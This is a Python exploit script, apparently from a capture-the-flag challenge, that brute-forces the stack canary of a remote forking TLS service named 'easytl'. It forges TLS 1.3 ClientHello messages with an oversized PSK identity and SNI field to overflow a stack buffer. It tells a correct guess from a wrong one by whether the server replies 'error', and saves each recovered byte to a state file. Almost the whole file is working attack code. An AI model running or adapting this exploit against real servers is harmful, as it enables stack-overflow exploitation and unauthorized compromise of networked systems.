#!/usr/bin/env python3
"""easytl remote stack-canary brute force (FORK server => one canary for all children).

Oracle (verified locally): the guard is in 0x40304d, called from the SSL info
callback on a *read alert*.  With a partial canary overwrite
    guess correct  -> canary check passes -> the callback continues and does
                      send(fd, "error", 5)   => we read exactly b"error"
    guess wrong    -> __stack_chk_fail -> child aborts -> connection dies, no data

Overflow geometry (all from the local analysis):
    identity[0x00:0x20] = "1401518dc5d7641ccd41593a5d812410"
    identity[0x20]      = 0x00                      (passes strlen()==0x20)
    identity[0x21:0x58] = filler
    identity[0x58+k]    = canary byte k             (byte 0 is 0x00 on glibc)
    SNI length          = 0x58 + number of canary bytes attempted
  => memcpy(buf, G970f40, strlen(SNI)) overwrites exactly that many bytes.

Discipline: strictly serial, --delay ms between connections, hard connection cap,
stops on ECONNREFUSED / timeout degradation / unclassifiable responses.
State is persisted to canary_state.json so consecutive runs continue.
"""
import argparse
import json
import os
import socket
import ssl
import statistics
import struct
import sys
import time

A = b"1401518dc5d7641ccd41593a5d812410"
HEXKEY = (b"c8ad2a35c51b87a466e22bc337696f08"
          b"07ff73500ee154ee71bee86d0b6bc358"
          b"422a0e90fca2ac1be5929a7be06fd428")
CLOSE_NOTIFY = bytes.fromhex("1503030002" "0100")
STATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "canary_state.json")


# ---------------------------------------------------------------- TLS helpers
def psk():
    import hashlib
    import hmac
    return hmac.new(bytes.fromhex(HEXKEY.decode()), A, hashlib.sha512).digest()


def hkdf_expand(prk, info, length, h):
    import hashlib
    import hmac
    t, okm, i = b"", b"", 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([i]), h).digest()
        okm += t
        i += 1
    return okm[:length]


def expand_label(secret, label, context, length, h):
    full = b"tls13 " + label
    info = struct.pack("!H", length) + bytes([len(full)]) + full + \
        bytes([len(context)]) + context
    return hkdf_expand(secret, info, length, h)


def split_ch(ch):
    body = ch[4:]
    off = 2 + 32
    off += 1 + body[off]
    cl = int.from_bytes(body[off:off + 2], "big")
    off += 2 + cl
    off += 1 + body[off]
    extl = int.from_bytes(body[off:off + 2], "big")
    return body[:off], body[off + 2:off + 2 + extl]


def rebuild(prefix, exts):
    body = prefix + struct.pack("!H", len(exts)) + exts
    return b"\x01" + len(body).to_bytes(3, "big") + body


def build_ch(template, identity, sni):
    import hashlib
    import hmac
    h = hashlib.sha384
    hlen = h().digest_size
    prefix, exts = split_ch(template)
    kept = b""
    i = 0
    while i < len(exts):
        t = int.from_bytes(exts[i:i + 2], "big")
        l = int.from_bytes(exts[i + 2:i + 4], "big")
        if t not in (0x0029, 0x0000):
            kept += exts[i:i + 4 + l]
        i += 4 + l
    name = struct.pack("!H", 1 + 2 + len(sni)) + b"\x00" + \
        struct.pack("!H", len(sni)) + sni
    kept = struct.pack("!HH", 0x0000, len(name)) + name + kept
    identities = struct.pack("!H", len(identity)) + identity + struct.pack("!I", 0)

    def assemble(b):
        bdy = (2 + len(identities)) + (2 + 1 + len(b))
        ext = struct.pack("!HH", 0x0029, bdy) + \
            struct.pack("!H", len(identities)) + identities + \
            struct.pack("!H", 1 + len(b)) + bytes([len(b)]) + b
        return rebuild(prefix, kept + ext)

    ch = assemble(b"\x00" * hlen)
    trunc = ch[:len(ch) - (2 + 1 + hlen)]
    early = hmac.new(b"\x00" * hlen, psk(), h).digest()
    bk = expand_label(early, b"ext binder", h(b"").digest(), hlen, h)
    fk = expand_label(bk, b"finished", b"", hlen, h)
    return assemble(hmac.new(fk, h(trunc).digest(), h).digest())


def make_identity(canary_prefix):
    n = len(canary_prefix)
    ident = A + b"\x00" + b"\x41" * (0x58 - 0x21) + bytes(canary_prefix)
    sni_len = 0x58 + n
    return ident, b"S" * sni_len


# ---------------------------------------------------------------- one attempt
def attempt(host, port, canary_prefix, template, timeout=6.0):
    """returns (verdict, info) where verdict in {'hit','miss','bad','refused'}"""
    ident, sni = make_identity(canary_prefix)
    ch = build_ch(template, ident, sni)
    t0 = time.time()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except ConnectionRefusedError:
        return "refused", {"t": time.time() - t0}
    except OSError as e:
        return "bad", {"err": str(e), "t": time.time() - t0}
    try:
        sock.sendall(b"\x16\x03\x01" + struct.pack("!H", len(ch)) + ch)
        sock.settimeout(timeout)
        sh = b""
        try:
            while len(sh) < 5:
                c = sock.recv(4096)
                if not c:
                    break
                sh += c
        except (ConnectionResetError, ssl.SSLError, OSError) as e:
            return "miss", {"stage": "pre-sh", "err": type(e).__name__, "t": time.time() - t0}
        if not sh or sh[0] != 0x16:
            return "bad", {"stage": "serverhello", "data": sh[:16].hex(), "t": time.time() - t0}
        try:
            while len(sh) < 5 + int.from_bytes(sh[3:5], "big"):
                c = sock.recv(4096)
                if not c:
                    break
                sh += c
        except (ConnectionResetError, ssl.SSLError, OSError) as e:
            return "miss", {"stage": "sh", "err": type(e).__name__, "t": time.time() - t0}
        sock.sendall(CLOSE_NOTIFY)
        sock.settimeout(2.5)
        resp = b""
        try:
            while True:
                c = sock.recv(4096)
                if not c:
                    break
                resp += c
                if len(resp) >= 5:
                    break
        except (socket.timeout, ssl.SSLError, OSError, ConnectionResetError):
            pass
        dt = time.time() - t0
        if resp[:5] == b"error":
            return "hit", {"resp": resp[:16].hex(), "t": dt}
        return "miss", {"resp_len": len(resp), "t": dt}
    finally:
        try:
            sock.close()
        except OSError:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--delay-ms", type=int, default=550)
    ap.add_argument("--max-conns", type=int, default=2500)
    ap.add_argument("--byte", type=int, default=None, help="only this canary byte index")
    ap.add_argument("--template", default="captured_ch.bin")
    ap.add_argument("--baseline", action="store_true")
    ap.add_argument("--oracle-check", action="store_true")
    ap.add_argument("--check-prefix", default=None, help="hex of known canary bytes prefix")
    args = ap.parse_args()

    template = open(args.template, "rb").read()[5:]

    if args.baseline:
        ts = []
        for _ in range(5):
            t0 = time.time()
            s = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            s.check_hostname = False
            s.verify_mode = ssl.CERT_NONE
            sock = s.wrap_socket(socket.create_connection((args.host, args.port), timeout=6))
            ts.append((time.time() - t0) * 1000)
            sock.close()
            time.sleep(args.delay_ms / 1000.0)
        print("baseline ms:", [round(x) for x in ts], "median", round(statistics.median(ts)))
        return

    state = {"canary": []}
    if os.path.exists(STATE):
        state = json.load(open(STATE))
    canary = state.get("canary", [])
    if not canary:
        canary = [0]               # glibc canary low byte is 0x00 — free
    print("canary prefix so far:", bytes(canary).hex())

    if args.check_prefix:
        pre = bytes.fromhex(args.check_prefix)
        v, info = attempt(args.host, args.port, list(pre), template)
        print("check-prefix %s -> %s %s" % (args.check_prefix, v, info))
        return 0 if v == "hit" else 1

    if args.oracle_check:
        # (a) no overflow at all (SNI = 0x20) must yield "error"
        v, info = attempt(args.host, args.port, [], template)
        print("control(no overflow, expect hit):", v, info)
        return

    idx = args.byte if args.byte is not None else len(canary)
    conns = 0
    t_hist = []
    for v in range(256):
        if conns >= args.max_conns:
            print("!! connection cap reached")
            break
        conns += 1
        verdict, info = attempt(args.host, args.port, canary + [v], template)
        tries = 0
        while verdict == "bad" and tries < 3:      # transient reset: retry
            tries += 1
            conns += 1
            time.sleep(0.3)
            verdict, info = attempt(args.host, args.port, canary + [v], template)
        t_hist.append(info.get("t", 0))
        print("byte[%d] guess=%#04x -> %s %s" % (idx, v, verdict, info), flush=True)
        if verdict == "refused":
            print("!! ECONNREFUSED — STOPPING per discipline")
            return 2
        if verdict == "bad":
            print("!! bad stage — STOPPING per discipline")
            return 3
        if verdict == "hit":
            canary = canary + [v]
            state["canary"] = canary
            json.dump(state, open(STATE, "w"))
            print("*** BYTE %d FOUND: %#04x  canary so far = %s" %
                  (idx, v, bytes(canary).hex()), flush=True)
            return 0
        time.sleep(args.delay_ms / 1000.0)
    print("!! no hit for byte %d after %d conns (median t=%.2fs)" %
          (idx, conns, statistics.median(t_hist) if t_hist else -1))
    return 1


if __name__ == "__main__":
    sys.exit(main())
